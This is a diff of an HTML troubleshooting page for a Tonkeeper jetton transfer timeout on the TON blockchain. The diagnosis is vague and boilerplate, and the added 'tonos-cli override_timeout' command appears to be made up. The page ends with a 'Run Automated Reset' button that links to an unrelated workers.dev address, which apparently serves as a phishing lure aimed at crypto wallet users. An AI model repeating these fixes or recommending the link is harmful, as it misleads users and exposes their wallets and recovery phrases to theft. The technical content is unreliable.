@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: system-ui;
-        background: #0a0c10;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -41,26 +41,27 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons, indicating a failure in the transaction process that results in an infinite loop of attempts to complete the transfer.</li>
+<li>Users experience a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons within the TON ecosystem, resulting in failed transactions and frustration.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a misconfiguration or overload in the TON (Telegram Open Network) ecosystem, specifically within the Tonkeeper wallet's interaction with the blockchain, leading to a timeout in the transaction loop.</li>
+<li>The error occurs due to a timeout in the transfer loop, which can be caused by network congestion, insufficient gas, or faulty smart contract configuration, leading to a deadlock in the transaction processing.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Check the TON blockchain for network congestion and high gas fees, which can slow down transactions.</li>
-<li>Verify that the Tonkeeper wallet is updated to the latest version to ensure compatibility with the current TON network state.</li>
+<li>Increase the gas limit for the transaction to ensure sufficient resources are allocated.</li>
+<li>Verify the smart contract configuration to ensure it is correctly set up for jetton transfers.</li>
+<li>Use the following command to override the default timeout settings:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>GET<span class="w"> </span><span class="s1">&#39;https://ton.apiTonkeeper.com/info&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Authorization: Bearer YOUR_ACCESS_TOKEN&#39;</span>
+<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>&lt;contract_address&gt;<span class="w"> </span>override_timeout<span class="w"> </span><span class="s1">&#39;{&quot;timeout&quot;: 300}&#39;</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more detailed network analysis. </p>
+<p>Consider utilizing an external console for more advanced troubleshooting and configuration adjustments. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Access to the TON blockchain explorer</li>
-<li>Latest version of the Tonkeeper wallet installed</li>
-<li>A basic understanding of blockchain transactions and gas fees</li>
+<li>Basic understanding of TON ecosystem and Tonkeeper functionality</li>
+<li>Familiarity with smart contract configuration and gas management</li>
+<li>Access to the <code>tonos-cli</code> command-line tool</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
